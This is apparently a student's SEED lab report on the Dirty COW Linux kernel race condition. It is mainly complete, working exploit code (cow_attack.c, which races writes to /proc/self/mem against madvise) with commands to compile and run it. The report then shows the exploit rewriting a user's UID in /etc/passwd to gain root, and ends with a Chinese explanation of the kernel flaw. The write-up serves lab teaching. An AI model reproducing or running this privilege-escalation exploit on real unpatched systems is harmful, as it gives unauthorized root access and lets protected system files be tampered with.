---
title: Dirty-Cow
date: 2020-01-29 22:50:43
tags: [Security]
categories: [Security]
toc: true
comments: true
---

![](images/Race-Condition/Platform-SEEDUbuntu16__04--32bit-green.svg)  ![](images/Dirty-Cow/SEED-SoftwareSecurityLab-brightgreen.svg)

> this report was written by Simon Nie when finishing the SEED Lab — Dirty Cow.

Table of Contents
=================

* [Task 1: Modify a Dummy Read-Only File](#task-1-modify-a-dummy-read-only-file)
    * [1. Create a Dummy File](#1-create-a-dummy-file)
    * [2. Set Up the Memory Mapping Thread](#2-set-up-the-memory-mapping-thread)
    * [3. Set up the write thread.](#3-set-up-the-write-thread)
    * [4. The madvise thread](#4-the-madvise-thread)
    * [5. Launch the attack](#5-launch-the-attack)
* [Task 2: Modify the Password File to Gain the Root Privilege](#task-2-modify-the-password-file-to-gain-the-root-privilege)
* [Summary](#summary)
* [Dirty COW 漏洞原理分析](#dirty-cow-漏洞原理分析)


## Task 1: Modify a Dummy Read-Only File

### 1. Create a Dummy File

```shell
$ sudo touch /zzz
$ sudo chmod 644 /zzz
$ sudo gedit /zzz
$ cat /zzz
111111222222333333
$ ls -l /zzz
-rw-r--r-- 1 root root 19 Oct 18 22:03 /zzz
$ echo 99999 > /zzz
bash: /zzz: Permission denied
```

From the above experiment, we can see that if we try to write to this file as a normal user, we will fail, because the file is only readable to normal users. However, because of the Dirty COW vulnerability in the system, we can find a way to write to this file. Our objective is to replace the pattern "222222" with ”`*****`”.

### 2. Set Up the Memory Mapping Thread

Download `cow_attack.c` from the website and read the source code.

```c
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in the read-only mode.
  int f=open("/zzz", O_RDONLY);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the position of the target area
  char *position = strstr(map, "222222");                        

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
  pthread_create(&pth2, NULL, writeThread, position);             

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

void *writeThread(void *arg)
{
  char *content= "******";
  off_t offset = (off_t) arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}

```

The program has three threads. One is main thread—mapping `/zzz` to memory, finds where the pattern `222222` is, and then creates two threads to exploit the Dirty Cow race condition vulnerability in the OS kernel.

### 3. Set up the `write` thread.

The job of the `write` thread is to replace the string “222222” in the **memory** with “`******`”. Since the mapped memory is of COW type (copy on write), this thread alone will only be able to modify the contents in a copy of the mapped memory, which will not cause any change to the `/zzz` file.

```c
/* cow_attack.c (the write thread) */
void *writeThread(void *arg)
{
char *content= "******";
off_t offset = (off_t) arg;
int f=open("/proc/self/mem", O_RDWR);
while(1) {
// Move the file pointer to the corresponding position.
lseek(f, offset, SEEK_SET);
// Write to the memory.
write(f, content, strlen(content));
}
```

### 4. The `madvise` thread

The `madvise` thread does only one thing: discarding the private copy of the mapped memory, so the page table can point back to the original mapped memory.

```c
/* cow_attack.c (the madvise thread) */
void *madviseThread(void *arg)
{
int file_size = (int) arg;
while(1){
madvise(map, file_size, MADV_DONTNEED);
}
}
```

### 5. Launch the attack

```shell
$ gcc cow_attack.c -lpthread
$ a.out
... press Ctrl-C after a few seconds ...
```

If the `write()` and the `madvise()` system calls are invoked alternatively, i.e., one is invoked only after the other is finished, the write operation will always be performed on the private copy, and we will never be able to modify the target file. The only way for the attack to succeed is to perform the `madvise()` system call while the `write()` system call is still running. We cannot always achieve that, so we need to try many times. As long as the probability is not extremely low, we have a chance. That is why in the threads, we run the two system calls in an infinite loop. 

## Task 2: Modify the Password File to Gain the Root Privilege

we want choose the `/etc/passwd` file as our target file. Please remember get a copy of original `passwd` file in case we doing something bad.

add another normal user:

```shell
$ sudo adduser charlie
...
$ cat /etc/passwd | grep charlie
charlie:x:1001:1001:,,,:/home/charlie:/bin/bash
```

modify the program, replace “222222” with “1001”, replace “`******`” with “0000”, replace “/zzz” with “/etc/passwd”. Do the same steps with last part.

check results.

```shell
seed@ubuntu$ su charlie
Passwd:
root@ubuntu# id
uid=0(root) gid=1001(charlie) groups=0(root),1001(charlie)
```

Succeed!

## Summary

写入时复制（英语：Copy-on-write，简称COW）是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。这过程对其他的调用者都是透明的（transparently）。

优点是如果调用者没有修改该资源，就不会有副本（private copy）被建立，因此多个调用者只是读取操作时可以共享同一份资源。

如果在写的时候，刚好内存中的private copy 被丢弃，那么就会直接指向原文件，修改的内容会直接被写入原文件。

## Dirty COW 漏洞原理分析

详细链接见https://www.anquanke.com/post/id/84784。

简单来说，就是：

> 当调用write系统调用向/proc/self/mem文件中写入数据时，进入内核态后内核会调用get_user_pages函数获取要写入内存地址。get_user_pages会调用follow_page_mask来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有可写的权限。
>
> 第一次获取内存的页表项会因为缺页而失败。get_user_page调用faultin_page进行缺页处理后第二次调用follow_page_mask获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。这时候get_user_pages函数会第三次调用follow_page_mask来获取该内存的页表项，并且不再要求页表项所指向的内存映射具有可写的权限，这时是可以成功获取的，获取成功后内核会对这个只读的内存进行强制的写入操作。
>
> 这个实现是没有问题的，因为本来写入/proc/self/mem就是一个无视映射权限的强行写入，就算是文件映射到虚拟内存中，也不会出现越权写：
>
> 如果写入的虚拟内存是一个VM_PRIVATE的映射，那在缺页的时候内核就会执行COW操作产生一个副本来进行写入，写入的内容是不会同步到文件中的
>
> 如果写入的虚拟内存是一个VM_SHARE的映射，那mmap能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。
>
> 但是，在上述流程中，如果第二次获取页表项失败之后，另一个线程调用madvice(addr,addrlen, MADV_DONTNEED),其中addr~addr+addrlen是一个只读文件的VM_PRIVATE的只读内存映射，那该映射的页表项会被置空。这时如果get_user_pages函数第三次调用follow_page_mask来获取该内存的页表项。**由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行COW操作产生一个副本以供写入。所以缺页处理完成后后第四次调用follow_page_mask获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。**